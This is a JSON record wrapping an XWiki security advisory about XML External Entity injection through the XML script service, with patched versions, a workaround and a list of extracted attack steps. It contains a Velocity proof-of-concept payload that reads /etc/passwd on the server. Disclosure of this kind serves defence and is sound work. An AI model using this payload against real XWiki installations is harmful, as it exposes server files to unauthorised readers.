{"description": "### Impact\n\nIt's possible in a script to access any file accessing to the user running XWiki application server with XML External Entity Injection through the XML script service.\n\nFor example:\n\n```\n{{velocity}}\n#set($xml=$services.get('xml'))\n#set($xxe_payload = \"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root[<!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><root><foo>&xxe;</foo></root>\")\n#set($doc=$xml.parse($xxe_payload))\n$xml.serialize($doc)\n{{/velocity}}\n```\n\n### Patches\n\nThe problem has been patched on versions 12.10.10, 13.4.4 and 13.8RC1.\n\n### Workarounds\n\nThere's no easy workaround for fixing this vulnerability other than upgrading and being careful when giving Script rights.\n\n### References\n\nhttps://jira.xwiki.org/browse/XWIKI-18946\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki](https://jira.xwiki.org)\n* Email us at [XWiki Security mailing-list](mailto:security@xwiki.org)", "methods": ["XML External Entity Injection through the XML script service to access any file accessible to the user running the XWiki application server.", "Used a script to access the file /etc/passwd.", "Used the XML.parse() method to parse the malicious XML payload.", "Used the XML.serialize() method to serialize the parsed XML document.", "Used the services.get('xml') method to access the XML service.", "Used the #set() directive to assign the XML payload to a variable.", "Used the #velocity directive to execute the script."]}